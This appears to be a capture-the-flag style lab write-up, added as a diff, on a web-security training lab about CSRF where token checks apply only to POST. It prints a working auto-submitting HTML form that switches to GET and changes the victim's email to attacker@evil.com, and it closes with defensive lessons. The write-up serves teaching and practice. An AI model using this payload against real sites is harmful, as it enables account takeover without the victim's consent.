@@ -1,0 +1,69 @@
+================================
+LAB: CSRF where token validation depends on request method
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 02, 2026
+Lab URL: https://0ac9009804adaa7f83635737000e0066.web-security-academy.net
+Category: CSRF
+Level: Apprentice
+Objective: Use exploit server to host HTML page that performs CSRF attack to change victim's email
+Description: Email change functionality vulnerable to CSRF. CSRF defenses only applied to certain request methods.
+
+[RECONNAISSANCE]
+----------------
+Logged in as wiener:peter and tested email change functionality.
+
+Intercepted POST request to /my-account/change-email:
+- Parameters: email, csrf
+- CSRF token present: cPejSoNGdwucuvuYaYIxWb7nj1ltU488
+- Content-Type: application/x-www-form-urlencoded
+
+Changed request method from POST to GET while keeping all parameters.
+
+Result: Email changed successfully without CSRF token validation.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Application validates CSRF tokens only for POST requests.
+GET requests to /my-account/change-email are processed without token validation.
+State-changing operation (email update) accepts GET method.
+
+[EXPLOITATION]
+--------------
+Created HTML payload with auto-submitting form using GET method:
+
+```html
+<html>
+  <body>
+    <form action="https://0ac9009804adaa7f83635737000e0066.web-security-academy.net/my-account/change-email" method="GET">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+Steps:
+1. Stored payload on exploit server
+2. Delivered exploit to victim
+3. Victim's browser auto-submitted GET request with their session cookie
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit to victim.
+Victim's email successfully changed via CSRF GET request bypass.
+
+[LESSONS LEARNED]
+-----------------
+- CSRF defenses must apply to ALL HTTP methods that perform state changes
+- Never rely on request method alone for security controls
+- GET requests should never trigger state-changing operations (REST principle)
+- Defense: Validate CSRF tokens on every state-changing request regardless of method
+- Defense: Enforce proper HTTP method usage (POST/PUT/DELETE for mutations, GET for reads only)
+
